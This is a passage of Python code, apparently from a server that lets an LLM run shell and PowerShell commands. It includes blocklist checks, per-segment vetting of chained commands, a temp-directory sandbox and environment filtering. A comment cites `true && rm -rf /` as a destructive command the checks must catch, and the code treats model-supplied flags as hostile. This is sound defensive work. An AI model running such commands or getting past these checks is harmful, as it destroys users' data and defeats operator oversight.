            )
        # When chaining is allowed, split on operators and vet every individual
        # segment so that `true && rm -rf /` cannot sneak through (finding 2).
        # Note: splitting on raw operators cannot respect quoted operators (e.g.
        # a semicolon inside a string literal); this is an accepted trade-off
        # between security and a full POSIX-shell parse.
        segments = _OPERATOR_SPLIT_RE.split(cmd_stripped)
        for raw_seg in segments:
            seg_msg = _check_single_segment(raw_seg, powershell=powershell)
            if seg_msg:
                return seg_msg
        return None

    # 4. No metacharacters detected: vet as a single command segment
    return _check_single_segment(cmd_stripped, powershell=powershell)


async def handle_run_command(args: dict) -> str:
    cmd = args["cmd"]
    cwd = str(args.get("cwd", str(PROJECT_ROOT)))
    timeout = _clamp_shell_timeout(args.get("timeout", SHELL_TIMEOUT))
    # allow_chaining and sandbox_mode are operator/server-config-only values —
    # never read from model-supplied args (finding 2).  Any model-injected copy
    # of these keys is silently ignored here; additionalProperties:false on the
    # schema prevents them from being accepted in the first place.
    allow_chaining = False
    sandbox_mode = _sandbox_enabled()

    block_msg = _check_blocked(cmd, allow_chaining=allow_chaining)
    if block_msg:
        logger.warning(f"run_command BLOCKED: {cmd}")
        return block_msg

    if not sandbox_mode:
        try:
            validate_path(cwd)
        except PermissionError as e:
            return f"PERMISSION_ERROR: cwd {e}"

    # ── Cross-platform translation ───────────────────────────────────────
    original_cmd = cmd
    cmd = translate_command(cmd)
    if cmd != original_cmd:
        logger.info(f"run_command translated: {original_cmd!r} → {cmd!r}")
        # The translated string is what actually executes — vet it too, since
        # translation can rewrite a benign-looking token into a blocked one.
        block_msg = _check_blocked(cmd, allow_chaining=allow_chaining)
        if block_msg:
            logger.warning(f"run_command BLOCKED after translation: {cmd}")
            return block_msg

    logger.info(f"run_command: {cmd!r} cwd={cwd} sandbox={sandbox_mode}")
    sandbox_dir = None
    try:
        if sandbox_mode:
            sandbox_dir = tempfile.TemporaryDirectory(prefix="kim-shell-")
            exec_cwd = sandbox_dir.name
            env = _sandbox_env()
        else:
            exec_cwd = cwd
            # Never inherit the full parent env — strip injection-vector vars
            # even in non-sandbox mode (finding 2, part c).
            env = _filtered_env()

        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=exec_cwd,
            env=env,
            # Own process group so a timeout kill reaches grandchildren too (L4).
            start_new_session=not IS_WINDOWS,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            _kill_process_tree(proc)
            try:
                await asyncio.wait_for(proc.wait(), timeout=2)
            except asyncio.TimeoutError:
                logger.warning("run_command process did not exit after kill")
            return f"TIMEOUT: command exceeded {timeout}s"
        out = stdout.decode("utf-8", errors="replace")
        err = stderr.decode("utf-8", errors="replace")
        exit_code = proc.returncode
        parts = [f"exit_code: {exit_code}"]
        if out:
            parts.append(f"stdout:\n{out}")
        if err:
            parts.append(f"stderr:\n{err}")
        if sandbox_mode:
            parts.append("sandbox: enabled")
        return "\n".join(parts)
    except Exception as e:
        logger.error(f"run_command failed: {e}", exc_info=True)
        return f"ERROR: {e}"
    finally:
        if sandbox_dir is not None:
            sandbox_dir.cleanup()


async def handle_run_powershell(args: dict) -> str:
    """
    Run a PowerShell script block.

    Cross-platform behaviour:
      - Windows: Runs natively via powershell.exe
      - macOS/Linux: Attempts to use pwsh (PowerShell Core) if installed.
        If pwsh is not available, returns a clear error message suggesting
        the LLM use run_command with bash/zsh instead.
    """
    script = args["script"]
    timeout = _clamp_shell_timeout(args.get("timeout", SHELL_TIMEOUT))
    # sandbox_mode is operator/server-config-only — never from model args (finding 2).
    sandbox_mode = _sandbox_enabled()

    # PS scripts naturally chain; powershell=True relaxes the POSIX-only
    # backtick/$() substitution checks that are ordinary PS syntax (M2).
    block_msg = _check_blocked(script, allow_chaining=True, powershell=True)
    if block_msg:
        logger.warning("run_powershell BLOCKED")
        return block_msg

    # ── Determine PowerShell executable ──────────────────────────────────
    if IS_WINDOWS:
        ps_exe = "powershell.exe"
    else:
        # macOS/Linux: try PowerShell Core (pwsh)
        import shutil
        ps_exe = shutil.which("pwsh")
        if ps_exe is None:
            os_name = "macOS" if IS_MACOS else "Linux"
            return (
                f"OS_LIMITATION: PowerShell is not available on this {os_name} system. "
                f"PowerShell Core (pwsh) is not installed. "
                f"Please use the 'run_command' tool with bash/zsh syntax instead. "
                f"For example, replace 'Get-ChildItem' with 'ls -la', "
                f"'Get-Content file.txt' with 'cat file.txt', etc."
            )

    logger.info(f"run_powershell [{ps_exe}]: {script[:80]}... sandbox={sandbox_mode}")
    sandbox_dir = None
    try:
        if sandbox_mode:
            sandbox_dir = tempfile.TemporaryDirectory(prefix="kim-powershell-")
            exec_cwd = sandbox_dir.name
            env = _sandbox_env()
        else:
            exec_cwd = str(PROJECT_ROOT)
            # Never inherit the full parent env — strip injection-vector vars
            # even in non-sandbox mode (finding 2, part c).
            env = _filtered_env()

        ps_args = [
            ps_exe,
            "-NonInteractive",
            "-NoProfile",
        ]
        # Only Windows powershell.exe needs -ExecutionPolicy
        if IS_WINDOWS:
            ps_args.extend(["-ExecutionPolicy", "Bypass"])
        ps_args.extend(["-Command", script])

        proc = await asyncio.create_subprocess_exec(
            *ps_args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=exec_cwd,
            env=env,
            # Own process group so a timeout kill reaches grandchildren too (L4).
            start_new_session=not IS_WINDOWS,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            _kill_process_tree(proc)
            try:
                await asyncio.wait_for(proc.wait(), timeout=2)
            except asyncio.TimeoutError:
                logger.warning("run_powershell process did not exit after kill")
            return f"TIMEOUT: PowerShell exceeded {timeout}s"
        out = stdout.decode("utf-8", errors="replace")
        err = stderr.decode("utf-8", errors="replace")
        parts = [f"exit_code: {proc.returncode}"]
        if out:
            parts.append(f"stdout:\n{out}")
        if err:
            parts.append(f"stderr:\n{err}")
        if sandbox_mode:
            parts.append("sandbox: enabled")
        return "\n".join(parts)
    except Exception as e:
        logger.error(f"run_powershell failed: {e}", exc_info=True)
        return f"ERROR: {e}"
    finally:
        if sandbox_dir is not None:
            sandbox_dir.cleanup()
